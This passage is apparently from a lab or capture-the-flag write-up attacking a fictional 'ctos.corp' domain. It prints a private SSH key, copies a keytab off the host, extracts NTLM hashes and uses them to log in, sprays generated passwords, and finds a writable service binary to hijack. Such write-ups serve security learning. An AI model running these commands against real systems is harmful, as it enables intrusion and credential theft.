Ei/I/Ybmgwl0WQSyxpZELzrLjiFdrcDHRvdN9lk/UVS/g1qKkuxHAAUwSxRfHpZB5YiMVu
3xour4dL1fCuj0dv8BnN1LwQpSKYO7b59AcVD1S13lwAJ6ZAIx2YO+38HDyd9Qwh7Yauwg
pGc9YXmYTTFj8QDCNh5tGb/umK6cxbuwl7lAdkqqkgVvIBZqGQ5d874G6/F3teF4RZkou0
P6p+zAYTEakrgSL89JBhe+WWf07UKYSSmacXmiF+S38Xqe7fK9bkxsHkTWO4ywmr9xVab8
7d5XEUslQp+t+8peLU0IaRGkWDTYCrgPNt8k8KTQL5IR4qqaoDVnhtEhmoGuO9PVNHR3wW
Ike5bs6DmUmw+ToSxiwR8GtAkR3tmfqCKudbYtHUE41BIFVYN8trczoXRvCd10+PVLY6H+
w0ooDpbJPk/VQCooMzRGes7YmJ4z2U/p0auIxSgK4FE7+OPojCHyN64GmUQHMNQC+YDbyS
7lv+pC43QAfDa+yLFKSBnfP0H/BmJKUe/Ilb4nlitH7S/G3d26etPnA3PpTxFV/F/53p53
/NKTKWkZp3jtpz3bAuFkKSKeF5LgbzEG52cy7qj9w1S4HD2PkxD2ekeHnn+yP3PjdIckvF
csxWttHYiblftJ9a0pAAABAD98IjqA2PFzM0kJjMOyIK2ejhYcP1XA5xtF7/0wpjY6h4i/
q2LCdtpsSCBUK26BVSpnQft1fI4licFlQ4ZmLY4iuULHAhsk655DWUUMElDu4PscllNAwP
EIpCtj8H7F3Ej5pKvwXX2HaLtS3yYweSxXx0YdIx3LrsqcfptM2jtE416mceMHUNGaGO1Q
uXf7L4LJXk4/NQElSbLBHFUQ+6XeiYiZDyAFFFEnQSZrZ3oUqT59cjkvqRmiZvaAfQZXr+
+RT1zlV7SUcdPVfxrzeF4GGvO6yJuVfZgMT0aJNMc0jKMG2LomeC3J+ruqNJA96S2BTv39
Bs8tOho/G96YG2MAAAEBAO+CqvHcZSWbR3gJuPZcnLUXQtHpPjF/OQ2maqKbCb4U2PbXQ6
yJjADKUKC0+5bFRpDaiBtNf45VdX87NViuf4lXD3TneOpIeXJmlPx4jTVCa5xjjyTpUC53
l/51Dta7gUHnfvatrtwk8s92+X8HPy76xNVxFXvAVcTeJ0aK5d4K8xyXVuKktI7vf9V7AC
fBkh0WdOZGfpI9nBIwI3Kdaw5ONBYbcAAFjrzLo0+7yueututi++brqhboo2J+Umhu7IU0
teJaN6o0cZIXPghUYGNFoTwPEY84cIw5WkS+gp0+g6uHZ5i2bQF7cVTObdTEADBxexJlnd
RwFY/MFj3zXdcAAAEBAM9iY5PHUlX8Z1GNQEPWiJEB+2xdBm1LtA7hS+cu1wI3dyzRohaq
jrk8HOqwRCJNWVuFgZQERy+UChy9HlmwAihZ2wJzUgR5CHW/Wk+hc19h+PNyzxru4/qCPD
mt9laNpuWTo71KFammpJNMeevLecpTqAIP+B3ZCQwPiME9ixPZC0Q6awSZU0vq7MXO6U9z
oIhWnOeVL0mgZilGxog476d2WHECEyiC0cRBegyDTpgh4RxY13bVVqBDjOn2IDzmQJ0RsO
q7Vh2bE8RVB52q2Z/oIUbkaVXWG46I8MmQgExn8MtddLicMwaeceS3Z4TDr/VkfOVhxU5J
wftXailjmBkAAAALcm9vdEB3ZWItMDE=
-----END OPENSSH PRIVATE KEY-----
```

I can also get roots private key

Ill transfer to my machine and set the permissions

```python
ssh root@ctos.site -i root_id_rsa 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@web-01:~#   
```

I am now root

```python
scp -i root_id_rsa root@ctos.site:/etc/krb5.keytab .  
krb5.keytab    
```

Ill grab the keytab file and transfer to my machine

# Credentials extraction from keytab

```python
python3 keytabextract.py ../krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : CTOS.CORP
	SERVICE PRINCIPAL : svc_web/
	NTLM HASH : 4014777d5f38cb74d24f096972f47969
	AES-256 HASH : 3a3e495ba09ca005f4cf42763273fab2a4a3d4e4f8fd63716c70a67d5cda6ab6
	AES-128 HASH : 4990037026cbac870ac3d7b5635bfb46
```

I now have the credentials

# Initial access on the domain

```python
nxc smb dc01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969'
SMB         10.1.24.233     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\svc_web:4014777d5f38cb74d24f096972f47969
```

I can now enumerate the domain more

# Enumeration as `svc_web`

```python
nxc smb dc01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969' --shares
SMB         10.1.24.233     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\svc_web:4014777d5f38cb74d24f096972f47969 
SMB         10.1.24.233     445    DC01             [*] Enumerated shares
SMB         10.1.24.233     445    DC01             Share           Permissions     Remark
SMB         10.1.24.233     445    DC01             -----           -----------     ------
SMB         10.1.24.233     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.24.233     445    DC01             C$                              Default share
SMB         10.1.24.233     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.24.233     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.24.233     445    DC01             SYSVOL          READ            Logon server share
```

Only default shares on the domain controller

```python
nxc smb dc01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
j_wilson
l_conrad
m_chen
s_patel
e_rodriguez
d_kim
it_ops_lead
svc_web
svc_backup
svc_infra_mgr
IT-WS01$
WEB-01$
```

Ill grab all the users in the domain!

```python
nxc smb it-ws01.ctos.corp -u 'svc_web' -H '4014777d5f38cb74d24f096972f47969' --shares                                                                             
SMB         10.1.206.115    445    IT-WS01          [*] Windows Server 2022 Build 20348 x64 (name:IT-WS01) (domain:CTOS.CORP) (signing:False) (SMBv1:None)
SMB         10.1.206.115    445    IT-WS01          [+] CTOS.CORP\svc_web:4014777d5f38cb74d24f096972f47969 
SMB         10.1.206.115    445    IT-WS01          [*] Enumerated shares
SMB         10.1.206.115    445    IT-WS01          Share           Permissions     Remark
SMB         10.1.206.115    445    IT-WS01          -----           -----------     ------
SMB         10.1.206.115    445    IT-WS01          ADMIN$                          Remote Admin
SMB         10.1.206.115    445    IT-WS01          C$                              Default share
SMB         10.1.206.115    445    IT-WS01          IPC$            READ            Remote IPC
SMB         10.1.206.115    445    IT-WS01          IT_Onboarding   READ
```

I do have read on a non-default SMB share on the IT workstation

# `IT_Onboarding` share on `IT-WS01`

```python
impacket-smbclient ctos.corp/svc_web@it-ws01.ctos.corp -hashes ':4014777d5f38cb74d24f096972f47969'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT_Onboarding
# use IT_Onboarding
# ls
drw-rw-rw-          0  Sun Feb 15 09:26:28 2026 .
drw-rw-rw-          0  Sun Feb 15 09:13:03 2026 ..
-rw-rw-rw-      32951  Sun Feb 15 09:26:31 2026 SEC-POL-2026.pdf
# get SEC-POL-2026.pdf
# 
```

I have a PDF file

![](Pasted%20image%2020260901141840.png)

I have found a password policy

# Password spray leads to user compromise

There is 6 users aside fromt he service and machine accounts, i have all 6 full names from the home page on the web server

```python
j_wilson = james wilson
l_conrad = lisa conrad
m_chen = mike chen
s_patel = sarah patel
e_rodriguez = elena rodriguez
d_kim = david kim
```

Ill use this list to form a possibe password list

```python
JAM!2026@on
JAM!2026#on
JAM!2026$on
JAM!2026%on
JAM!2026&on
LIS!2026@ad
LIS!2026#ad
LIS!2026$ad
LIS!2026%ad
LIS!2026&ad
MIK!2026@en
MIK!2026#en
MIK!2026$en
MIK!2026%en
MIK!2026&en
SAR!2026@el
SAR!2026#el
SAR!2026$el
SAR!2026%el
SAR!2026&el
ELE!2026@ez
ELE!2026#ez
ELE!2026$ez
ELE!2026%ez
ELE!2026&ez
DAV!2026@im
DAV!2026#im
DAV!2026$im
DAV!2026%im
DAV!2026&im
```

This is the full password wordlist

Its also worth noting there isnt a password policy

```python
nxc smb dc01.ctos.corp -u users.txt -p passwords.txt --continue-on-success

...[SNIP]...

SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\l_conrad:LIS!2026$ad 
```

I have compromised a user `l_conrad`

```python
nxc winrm it-ws01.ctos.corp -u l_conrad -p 'LIS!2026$ad'     
WINRM       10.1.206.115    5985   IT-WS01          [*] Windows Server 2022 Build 20348 (name:IT-WS01) (domain:CTOS.CORP) 
WINRM       10.1.206.115    5985   IT-WS01          [+] CTOS.CORP\l_conrad:LIS!2026$ad (Pwn3d!)
```

This user has access over winrm on the IT workstation!

# Administrator on IT-WS01

```python
*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> icacls CTOSInventorySvc.exe
CTOSInventorySvc.exe BUILTIN\Users:(I)(M)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

I have the modify permission on an exe.

So ill setup my adaptix c2 server and connect to it in the vlicn